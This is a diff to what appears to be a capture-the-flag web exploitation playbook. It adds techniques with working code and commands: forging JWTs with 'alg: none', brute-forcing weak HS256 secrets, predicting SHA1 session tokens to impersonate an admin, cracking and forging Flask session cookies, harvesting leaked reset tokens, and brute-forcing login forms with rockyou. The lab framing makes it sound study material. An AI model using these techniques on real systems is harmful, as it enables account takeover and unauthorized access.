@@ -30,11 +30,16 @@ When landing on a new open port, follow this exact sequence:
    pipx run git-dumper http://<TARGET>:<PORT>/ recovered_repo && cd recovered_repo && git log --all --oneline
    ```
 5. **Inspect Cookies / Headers:** Run `curl -i http://<TARGET>:<PORT>/` to see cookies and headers.
-   - Look for `role=employee` ([8063](services/8063.md)) or base64 tokens ([8071](services/8071.md)).
+   - Look for plaintext roles like `role=employee` ([8063](services/8063.md)) or base64 tokens ([8071](services/8071.md)).
+   - Look for JWT tokens (`ey...` 3 parts): check for `"alg": "none"` bypass ([8066](services/8066.md)) or crack weak secrets ([8067](services/8067.md)).
+   - Look for Flask session cookies (`ey...` timestamped): inspect and crack with `flask-unsign` ([8070](services/8070.md)).
+   - Look for 40-hex SHA1 tokens: test timestamp / clock predictability ([8068](services/8068.md)).
 6. **Hidden Endpoints & Parameters:**
    ```bash
    ffuf -u http://<TARGET>:<PORT>/FUZZ -w /usr/share/dirb/wordlists/common.txt -mc 200,301,302
    ```
+7. **Password Reset Endpoints (`/forgot`):**
+   - Submit reset requests and check raw HTML source for hidden token links (`style="display: none"` as in [8070](services/8070.md)).
 
 ---
 
@@ -253,6 +258,95 @@ http://[::]:80/
 * `admin:admin`
 * `root:root`
 * `<username>:<username>123`
+
+### JWT "none" Algorithm Bypass ([8066](services/8066.md))
+When a server does not enforce cryptographic verification of the signature header:
+1. Decode the original token to identify payload fields (`sub`, `partner`, `role`, `account`).
+2. Generate an unsigned token setting `"alg": "none"` and leaving the signature empty (note the trailing period `.`):
+```bash
+TOKEN=$(python3 - <<'EOF'
+import base64, json
+def b64(o): return base64.urlsafe_b64encode(json.dumps(o, separators=(',', ':')).encode()).rstrip(b'=').decode()
+# Keep same payload claims, elevate role/partner/account
+print(b64({"alg": "none", "typ": "JWT"}) + "." + b64({"partner": "admin", "role": "admin"}) + ".")
+EOF
+)
+curl -H "Authorization: Bearer $TOKEN" http://<TARGET>:<PORT>/partner/admin
+```
+
+### JWT Weak HS256 Secret Brute-forcing ([8067](services/8067.md))
+If HS256 algorithm is enforced with a weak or numeric secret (e.g. 4-digit PIN):
+1. **Python offline brute-force (0000–9999 in <1s):**
+```python
+import base64, hashlib, hmac
+
+token = "<JWT_TOKEN>"
+h, p, sig_b64 = token.split(".")
+target = base64.urlsafe_b64decode(sig_b64 + "=" * (-len(sig_b64) % 4))
+signing_input = f"{h}.{p}".encode()
+
+for i in range(10000):
+    for s in (f"{i:04d}", str(i)):
+        if hmac.compare_digest(hmac.new(s.encode(), signing_input, hashlib.sha256).digest(), target):
+            print(f"[+] Found secret: {s}")
+            break
+```
+2. **Hashcat dictionary attack:**
+```bash
+echo '<JWT_TOKEN>' > /tmp/jwt.txt
+hashcat -m 16500 /tmp/jwt.txt ~/wordlists/rockyou.txt
+```
+
+### Predictable / Timestamp-based Session Tokens ([8068](services/8068.md))
+If the session cookie is a 40-character hex string (SHA-1) minted at login:
+1. Formula is commonly `sha1("<username>:<unix_second>")`.
+2. To impersonate an admin triggered by an event (e.g. `/bot/refresh-oncall`), record `time.time()`, bracket the window `[now - 3, now + 4]`, and test:
+```python
+import hashlib, time
+
+now = int(time.time())
+for t in range(now - 3, now + 4):
+    tok = hashlib.sha1(f"admin:{t}".encode()).hexdigest()
+    # Test with: curl -b "token={tok}" http://<TARGET>:<PORT>/ticket/admin
+```
+
+### Flask Session Cookie Tampering (`flask-unsign`) ([8070](services/8070.md))
+Flask stores session cookies using `itsdangerous` format (`<payload>.<timestamp>.<signature>`):
+```bash
+# 1. Install tool
+pip install flask-unsign
+
+# 2. Decode session contents
+flask-unsign --decode --cookie '<COOKIE>'
+
+# 3. Brute-force secret key
+flask-unsign --unsign --cookie '<COOKIE>' --wordlist ~/wordlists/rockyou.txt
+
+# 4. Forge arbitrary admin session cookie
+flask-unsign --sign --cookie "{'user': 'postmaster'}" --secret '<SECRET>'
+
+# 5. Access target with forged session
+curl -sS -b 'session=<FORGED_COOKIE>' http://<TARGET>:<PORT>/mailbox
+```
+
+### Password Reset Token Leakage & User Enumeration ([8070](services/8070.md))
+1. **User enumeration:** Check `/forgot` password responses for differences (status code, error messages, or response length deltas) between existing and non-existing accounts.
+2. **Hidden DOM leaks:** CTF challenges often leak generated reset tokens directly into response HTML:
+```bash
+curl -s -X POST http://<TARGET>:<PORT>/forgot --data-urlencode "username=admin" | grep -i "reset"
+# Look for <div style="display: none"><a href="/reset/<token>">...</a></div>
+```
+
+### Web Form Login Brute-Force ([8072](services/8072.md))
+When given a seeded account without credentials and no rate limiting:
+```bash
+ffuf -u http://<TARGET>:<PORT>/login -X POST \
+  -d "username=vpnuser&password=FUZZ" \
+  -w ~/wordlists/rockyou.txt \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -fr "Invalid|incorrect|failed"
+```
+Also try common weak passwords first: `admin`, `password`, `123456`, `qwerty`, `vpnuser`, `welcome`.
 
 ### Python Pickle RCE Deserialization ([8051](services/8051.md))
 Generate a base64 pickle payload executing arbitrary commands:
